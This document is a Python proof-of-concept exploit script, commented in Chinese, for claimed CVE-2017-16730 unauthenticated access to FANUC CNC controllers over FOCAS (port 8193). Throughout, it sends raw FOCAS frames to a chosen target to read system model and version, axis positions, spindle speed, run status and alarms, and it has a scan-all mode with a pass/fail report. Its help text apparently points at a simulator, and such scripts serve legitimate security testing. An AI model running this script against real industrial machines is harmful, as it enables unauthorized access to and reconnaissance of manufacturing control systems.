"""
POC - FOCAS (FANUC Open CNC API)
=================================
CVE-2017-16730: FANUC CNC 未授权访问漏洞利用验证。

漏洞:
1. unauthorized  — CVE-2017-16730 未授权访问 (读取 CNC 系统信息)
2. axis         — 未授权读取 CNC 轴坐标
3. dynamic      — 读取 CNC 动态数据 (转速/负载)
4. status       — 读取 CNC 运行状态
5. alarm        — 读取 CNC 报警信息
6. all          — 所有漏洞

用法:
  python poc.py --target 192.168.1.100 --vuln unauthorized
  python poc.py --target 192.168.1.100 --vuln axis
  python poc.py --target 192.168.1.100 --vuln all
"""

import argparse
import socket
import struct
import sys
from typing import Optional

POC_VERSION = '2.0.0'
FOCAS_PORT = 8193
FOCAS_HDR = 16


def _frame(func: int, data: bytes = b'', seq: int = 1) -> bytes:
    """构造 FOCAS 请求帧"""
    hdr = struct.pack('!HHHI', FOCAS_HDR + len(data), func, 0, seq) + b'\x00' * 6
    return hdr + data


def _hex_dump(data: bytes, width: int = 16) -> str:
    result = []
    for i in range(0, len(data), width):
        chunk = data[i:i + width]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        result.append(f'  {i:04x}  {hex_part:<{width*3}}  {ascii_part}')
    return '\n'.join(result)


class FOCASPOC:
    """FOCAS 漏洞 POC"""

    def __init__(self, target: str, port: int = FOCAS_PORT):
        self.target = target
        self.port = port
        self._seq = 0

    def _connect_send_recv(self, func: int, data: bytes = b'') -> bytes:
        """连接目标并发送/接收"""
        self._seq += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(8)
            s.connect((self.target, self.port))
            s.sendall(_frame(func, data, self._seq))
            resp = s.recv(4096)
            s.close()
            return resp
        except Exception as e:
            print(f'  [-] {e}')
            return b''

    def poc_unauthorized(self) -> bool:
        """CVE-2017-16730: 未授权访问 CNC 系统信息"""
        print(f'\n[*] POC: CVE-2017-16730 (FOCAS 未授权访问)')

        resp = self._connect_send_recv(0x0100)  # READ_SYSINFO

        if len(resp) >= FOCAS_HDR + 8:
            err = struct.unpack_from('!H', resp, 4)[0]
            data = resp[FOCAS_HDR:].rstrip(b'\x00')
            model = data[:32].decode('ascii', errors='replace').strip('\x00')
            version = data[32:40].decode('ascii', errors='replace').strip('\x00')
            max_axis = struct.unpack_from('!H', data, 40)[0] if len(data) >= 42 else '?'

            print(f'    错误码: 0x{err:04x}')
            print(f'    CNC 型号: {model}')
            print(f'    版本: {version}')
            print(f'    最大轴数: {max_axis}')
            print(f'    [+] 成功: 无需认证即可读取 CNC 系统信息')
            return err == 0
        else:
            print(f'    响应: {len(resp)}B (可能未连接)')
            if resp:
                print(f'    hex: {resp[:32].hex()}')
            return False

    def poc_axis(self) -> bool:
        """读取 CNC 轴坐标"""
        print(f'\n[*] POC: FOCAS 轴坐标读取')

        resp = self._connect_send_recv(0x0200)  # READ_AXIS

        if len(resp) >= FOCAS_HDR + 4:
            err = struct.unpack_from('!H', resp, 4)[0]
            data = resp[FOCAS_HDR:]
            print(f'    错误码: 0x{err:04x}')
            print(f'    数据 ({len(data)}B):')

            pos = 0
            axis_count = 0
            while pos + 6 <= len(data):
                axis_no = struct.unpack_from('!h', data, pos)[0]
                axis_pos = struct.unpack_from('!i', data, pos + 2)[0] / 1000.0
                axis_count += 1
                print(f'      轴 {axis_no}: {axis_pos:.3f} mm')
                pos += 6

            if axis_count == 0:
                print(f'      原始: {data.hex()[:48]}')

            print(f'    未授权读取 {axis_count} 轴坐标成功')
            return axis_count > 0
        else:
            print(f'    无有效响应 ({len(resp)}B)')
            return False

    def poc_dynamic(self) -> bool:
        """读取 CNC 动态数据 (转速/负载)"""
        print(f'\n[*] POC: FOCAS 动态数据读取')

        resp = self._connect_send_recv(0x0201)  # READ_DYNAMIC

        if len(resp) >= FOCAS_HDR + 4:
            err = struct.unpack_from('!H', resp, 4)[0]
            data = resp[FOCAS_HDR:]
            print(f'    错误码: 0x{err:04x}')
            print(f'    数据: {data.hex()[:64]}')
        else:
            print(f'    无响应 ({len(resp)}B)')

        # 尝试读取主轴转速
        resp2 = self._connect_send_recv(0x0700)  # READ_SPEED
        if len(resp2) >= FOCAS_HDR + 4:
            err2 = struct.unpack_from('!H', resp2, 4)[0]
            speed = struct.unpack_from('!i', resp2, FOCAS_HDR)[0] if len(resp2) >= FOCAS_HDR + 4 else 0
            print(f'    主轴转速: {speed} RPM (err=0x{err2:04x})')

        return True

    def poc_status(self) -> bool:
        """读取 CNC 运行状态"""
        print(f'\n[*] POC: FOCAS 运行状态')

        resp = self._connect_send_recv(0x0600)  # READ_STATUS

        if len(resp) >= FOCAS_HDR + 4:
            err = struct.unpack_from('!H', resp, 4)[0]
            data = resp[FOCAS_HDR:]
            if len(data) >= 4:
                operating = struct.unpack_from('!H', data, 0)[0]
                alarm = struct.unpack_from('!H', data, 2)[0]
                print(f'    运行中: {bool(operating)}')
                print(f'    报警: {bool(alarm)}')
            else:
                print(f'    数据: {data.hex()[:32]}')
            print(f'    错误码: 0x{err:04x}')
        else:
            print(f'    无响应')

        return True

    def poc_alarm(self) -> bool:
        """读取 CNC 报警信息"""
        print(f'\n[*] POC: FOCAS 报警信息')

        resp = self._connect_send_recv(0x0300)  # READ_ALARM

        if len(resp) >= FOCAS_HDR + 4:
            err = struct.unpack_from('!H', resp, 4)[0]
            data = resp[FOCAS_HDR:]
            alarm_code = struct.unpack_from('!H', data, 0)[0] if len(data) >= 2 else 0
            alarm_msg = data[2:].rstrip(b'\x00').decode('ascii', errors='replace')
            print(f'    报警码: 0x{alarm_code:04x}')
            print(f'    报警信息: {alarm_msg}')
            print(f'    错误码: 0x{err:04x}')
        else:
            print(f'    无响应')

        return True

    def run_all(self):
        """运行所有 POC"""
        print(f'FOCAS POC v{POC_VERSION} — 全扫描模式')
        print(f'  目标: {self.target}:{self.port}\n')

        results = []
        for name, fn in [
            ('CVE-2017-16730 未授权访问', self.poc_unauthorized),
            ('轴坐标读取', self.poc_axis),
            ('动态数据读取', self.poc_dynamic),
            ('运行状态读取', self.poc_status),
            ('报警信息读取', self.poc_alarm),
        ]:
            print(f'{"=" * 50}')
            print(f'  [{name}]')
            print(f'{"=" * 50}')
            r = fn()
            results.append((name, r))

        print(f'\n\n{"=" * 50}')
        print(f'  POC 扫描报告')
        print(f'{"=" * 50}')
        for name, success in results:
            print(f'  [{"+" if success else "-"}] {name}')
        print(f'  [结果] {sum(1 for _, s in results if s)}/{len(results)} 通过')


def main():
    parser = argparse.ArgumentParser(
        description=f'FOCAS POC v{POC_VERSION} — FANUC CNC 未授权访问漏洞利用验证')
    parser.add_argument('--target', required=True,
                        help='FOCAS 模拟器地址')
    parser.add_argument('--port', type=int, default=FOCAS_PORT,
                        help=f'目标端口 (默认 {FOCAS_PORT})')
    parser.add_argument('--vuln',
                        choices=['unauthorized', 'axis', 'dynamic', 'status',
                                 'alarm', 'all'],
                        default='unauthorized', help='漏洞类型')

    args = parser.parse_args()
    poc = FOCASPOC(args.target, args.port)
    print(f'FOCAS POC v{POC_VERSION} | 目标: {args.target}:{args.port}')

    vuln_map = {
        'unauthorized': ('CVE-2017-16730 未授权访问', poc.poc_unauthorized),
        'axis': ('轴坐标', poc.poc_axis),
        'dynamic': ('动态数据', poc.poc_dynamic),
        'status': ('运行状态', poc.poc_status),
        'alarm': ('报警信息', poc.poc_alarm),
    }

    if args.vuln == 'all':
        poc.run_all()
    else:
        name, fn = vuln_map[args.vuln]
        fn()


if __name__ == '__main__':
    main()
